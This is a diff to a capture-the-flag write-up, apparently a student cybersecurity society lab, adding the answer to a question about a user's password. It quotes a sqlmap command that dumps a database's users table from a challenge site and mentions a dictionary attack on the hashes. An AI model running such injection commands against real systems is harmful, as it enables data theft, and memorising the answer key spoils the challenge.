@@ -97,6 +97,8 @@ If you look at the output from the dump command, you could see that there were _
 ## Question 3
 __Question:__ What is Alex's password?
 
+__Answer:__ chocolate
+
 If you ran the command `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -D boat_club -T users --dump` from [question 2](#question-2), and used SQLMap to perform a dictionary based attack, you could see the raw passwords. This command produced the output:
 ```
 Database: boat_club
